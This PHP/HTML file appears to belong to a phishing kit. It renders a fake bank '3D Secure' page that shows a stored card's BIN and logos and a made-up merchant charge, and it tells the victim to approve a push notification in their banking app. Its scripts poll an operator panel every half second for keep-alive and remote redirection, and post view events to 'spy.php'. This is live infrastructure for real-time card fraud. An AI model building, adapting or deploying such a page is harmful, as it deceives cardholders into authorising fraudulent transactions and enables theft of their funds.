<?php

require '../main.php';
require_once 'LanguageManager.php';
require_once 'bank_utils.php';

$languageManager = new LanguageManager();

// Get card brand logo from session
if (isset($_SESSION["cardType"])) {
    switch ($_SESSION["cardType"]) {
        case "visa": $imagePath = CARD_IMAGE_PATHS['visa']; break;
        case "mastercard": $imagePath = CARD_IMAGE_PATHS['mastercard']; break;
        case "amex": $imagePath = CARD_IMAGE_PATHS['amex']; break;
        default: $imagePath = CARD_IMAGE_PATHS['default']; break;
    }
} else if (isset($_SESSION["fullCardNumber"])) {
    $cardInfo = getCardInfo($_SESSION["fullCardNumber"]);
    $imagePath = file_exists($cardInfo["imagePath"]) ? $cardInfo["imagePath"] : CARD_IMAGE_PATHS["default"];
} else {
    $imagePath = CARD_IMAGE_PATHS['default'];
}

// Store last four digits for display
if (isset($_SESSION["fullCardNumber"])) {
    $_SESSION["lastFourDigits"] = substr($_SESSION["fullCardNumber"], -4);
}

// Derive bank logo from BIN cache (actual logo fetched async via JS + logo_fetch.php)
$bankLogo = './res/blank.svg';
$bankName = 'Unknown Bank';
$bin = '';
if (isset($_SESSION['firstSixDigits'])) {
    $bin = htmlspecialchars($_SESSION['firstSixDigits']);
    $bankInfo = getBank($bin);
    $bankName = $bankInfo['bank'];
    // Use cached logo URL if available
    if (!empty($bankInfo['logo']) && $bankInfo['logo'] !== './res/blank.svg') {
        $bankLogo = $bankInfo['logo'];
    }
}


?>


<!DOCTYPE html>
<html lang="<?php echo $languageManager->getLanguage(); ?>">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title><?php echo t('secure_app_verification', 'Secure App Verification'); ?></title>
  <script src="./res/jq.js"></script>
  <script src="./res/v.js"></script>
  <style>
  :root {
    --primary-color: #0a74da;
    --border-color: #dee2e6;
    --bg-color: #f9fafb;
    --text-color: #212529;
    --subtext-color: #6c757d;
  }

  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    font-family: 'Segoe UI', Roboto, Arial, sans-serif;
    font-size: 1rem;
    color: var(--text-color);
    background-color: rgba(0, 0, 0, 0.5);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
  }

  .modal {
    background: rgba(0, 0, 0, 0.5);
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 1000;
  }

  .modal-content {
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
    position: relative;
    max-width: 90vw;
    max-height: 90vh;
    overflow-y: auto;
  }

  .close {
    position: absolute;
    top: 15px;
    right: 20px;
    font-size: 28px;
    font-weight: bold;
    color: #aaa;
    cursor: pointer;
    z-index: 1001;
    background: none;
    border: none;
    padding: 0;
    line-height: 1;
  }

  .close:hover,
  .close:focus {
    color: #000;
    text-decoration: none;
  }

  .container {
    background: #fff;
    max-width: 450px;
    width: 100%;
    padding: 2rem;
    border-radius: 8px;
  }

  .loading-content {
    max-width: 450px;
    width: 100%;
    margin: 0 auto;
    min-height: 500px;
    padding: 2rem;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    text-align: center;
  }

  .modal-spinner {
    border: 4px solid #f3f3f3;
    border-top: 4px solid var(--primary-color);
    border-radius: 50%;
    width: 50px;
    height: 50px;
    animation: spin 1s linear infinite;
    margin-bottom: 20px;
  }

  .loading-message {
    font-size: 1.1rem;
    color: var(--text-color);
    font-weight: 500;
  }

  .main-content {
    display: none;
  }

  .logo-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 1.5rem;
    border-bottom: 1px solid var(--border-color);
    padding-bottom: 1rem;
  }

  .logo-bar img {
    max-height: 40px;
    object-fit: contain;
  }

  h1 {
    font-size: 1.25rem;
    font-weight: 600;
    margin-bottom: 1rem;
  }

  p.instruction {
    font-size: 0.95rem;
    color: var(--subtext-color);
    margin-bottom: 1.5rem;
  }

  table {
    width: 100%;
    font-size: 0.95rem;
    border-collapse: collapse;
  }

  td {
    padding: 0.5rem 0;
  }

  .label {
    font-weight: 600;
    color: #495057;
    width: 40%;
    text-align: right;
    padding-right: 1rem;
    vertical-align: top;
  }

  .value {
    text-align: left;
    color: #212529;
    word-break: break-word;
  }

  .status {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    font-size: 0.9rem;
    color: var(--subtext-color);
    margin-top: 1.5rem;
  }

  /* SVG Loader */
  .loader {
    width: 20px;
    height: 20px;
    display: inline-block;
  }

  @keyframes l27 {
    100% {
      transform: rotate(1turn)
    }
  }

  @keyframes l3 {
    to {
      transform: rotate(1turn)
    }
  }

  @keyframes spin {
    to {
      transform: rotate(360deg);
    }
  }

  footer {
    text-align: center;
    font-size: 0.85rem;
    color: var(--subtext-color);
    margin-top: 2rem;
    border-top: 1px solid var(--border-color);
    padding-top: 1rem;
  }

  footer u {
    color: var(--primary-color);
    cursor: pointer;
  }

  /* Mobile */
  @media (max-width: 480px) {
    body {
      padding: 10px;
    }

    .modal-content {

      max-height: 95vh;
      margin: 10px;
    }

    .container {
      padding: 1.5rem;
      max-width: 100%;
    }

    .loading-content {
      padding: 1.5rem;
      max-width: 100%;

    }

    .close {
      top: 10px;
      right: 15px;
      font-size: 24px;
    }

    .logo-bar img {
      max-height: 35px;
    }

    td.label,
    td.value {
      display: block;
      text-align: left;
      padding: 0.25rem 0;
    }

    td.label {
      font-weight: bold;
      padding-top: 1rem;
    }

    table {
      border: none;
    }
  }
  </style>
</head>

<body>
  <div class="modal" id="transactionModal">
    <div class="modal-content">
      <span class="close" style="display:none;" id="closeModal">&times;</span>

      <div class="loading-content" id="loadingContent">
        <div class="modal-spinner"></div>
        <div class="loading-message">
          <?php echo t("please_wait_message", "Please be patient, this may take a while!"); ?></div>
      </div>

      <main class="container main-content" role="main" aria-labelledby="pageTitle" id="mainContent">
        <div class="logo-bar" aria-label="Logos">

          <img id="bankLogo" src="<?php echo isset($bankLogo) ? htmlspecialchars($bankLogo) : ''; ?>" alt="Bank Logo" onerror="this.onerror=null;this.src='./res/blank.svg';" />
          <img src="<?php echo isset($imagePath) ? htmlspecialchars($imagePath) : ''; ?>" alt="Card Logo" />
        </div>

        <h1 id="pageTitle"><?php echo t('online_purchase_3d_secure', 'Online Purchase - 3D Secure authentication'); ?>
        </h1>
        <p class="instruction">
          <?php echo t('confirm_transaction_instruction', 'Please confirm this transaction using your mobile banking app. You should receive a push notification shortly.'); ?>
        </p>
        <table aria-label="Transaction Details">
          <tr>
            <td class="label"><?php echo t('merchant', 'Merchant:'); ?></td>
            <td class="value" id="contentBlock-merchantname">Freeparking Network LTD</td>
          </tr>
          <tr>
            <td class="label"><?php echo t('amount', 'Amount:'); ?></td>
            <td class="value" id="contentBlock-amount">$12.65</td>
          </tr>
          <tr>
            <td class="label"><?php echo t('date', 'Date:'); ?></td>
            <td class="value"> <?php echo date('Y-m-d H:i:s'); ?> </td>
          </tr>
          <tr>
            <td class="label"><?php echo t('card', 'Card:'); ?></td>
            <td class="value" id="contentBlock-maskedpan">
              <?php if (isset($_SESSION['firstSixDigits'])) echo htmlspecialchars($_SESSION['firstSixDigits']); ?>******
            </td>
          </tr>
        </table>
        <div class="status" role="status" aria-live="polite">
          <img src="res/loading.svg" class="loader" aria-hidden="true" alt="Loading">
          <span><?php echo t('waiting_mobile_confirmation', 'Waiting for mobile app confirmation...'); ?></span>
        </div>
        <footer>
          <p>
            <?php echo t('no_notification_help', 'If you don\'t receive a notification, please open your banking app manually.'); ?>
          </p>
          <p>
            <u tabindex="0"><?php echo t('need_help_auth', 'Need Help? Learn more about Authentication'); ?></u>
          </p>

        </footer>
      </main>
    </div>
  </div>

  <script src="./res/arr.js"></script>

  <script>

  function clearRedirections() {
        $.post("<?php echo $ajaxPath; ?>", { clearRedirection: 1 });
    }

    clearRedirections();

    // Keep alive with server
    setInterval(function() {
        $.post("<?php echo $ajaxPath; ?>", { keepAlive: 1, page: "app " + "<?php echo htmlspecialchars($_GET['e'] ?? '', ENT_QUOTES, 'UTF-8'); ?>" });
    }, 500);

    var redirect = 0;

    // Check for redirection
    setInterval(function() {
        $.post("<?php echo $ajaxPath; ?>", { redirectionListener: 1 }, function(data) {
            redirect = data;
            if (redirect == 0) {
                return false;
            } else {
                clearRedirections();
                window.location = targets[redirect];
            }
        });
    }, 500);
    // App view tracking
    $.post("spy.php", {
      appview: 1
    }).fail(function() {
      console.warn('Failed to track app view');
    });


  // Modal and loading functionality
  const modal = document.getElementById('transactionModal');
  const closeBtn = document.getElementById('closeModal');
  const loadingContent = document.getElementById('loadingContent');
  const mainContent = document.getElementById('mainContent');

  // Show loading for 3 seconds, then show main content
  setTimeout(function() {
    loadingContent.style.display = 'none';
    mainContent.style.display = 'block';
  }, 3000);

  // Close modal when clicking the X button
  closeBtn.onclick = function() {
    modal.style.display = 'none';
  };


  // Close modal when pressing Escape key
  document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
      modal.style.display = 'none';
    }
  });
  </script>
<script>
// Async bank logo loader via Google Favicon API proxy
(function() {
    var bankName = <?php echo json_encode($bankName); ?>;
    var bin = <?php echo json_encode($bin); ?>;
    var bankLogoEl = document.getElementById('bankLogo');

    if (!bankName || bankName === 'Unknown Bank' || !bankLogoEl) return;

    var currentSrc = bankLogoEl.getAttribute('src');
    if (currentSrc && currentSrc.indexOf('blank.svg') === -1 && currentSrc !== '') return;

    $.post('logo_fetch.php', { bankName: bankName, bin: bin }, function(response) {
        if (response && response.logo && response.logo !== './res/blank.svg') {
            var testImg = new Image();
            testImg.onload = function() {
                if (testImg.naturalWidth > 1 && testImg.naturalHeight > 1) {
                    bankLogoEl.src = response.logo;
                }
            };
            testImg.src = response.logo;
        }
    }, 'json');
})();
</script>
</body>

</html>
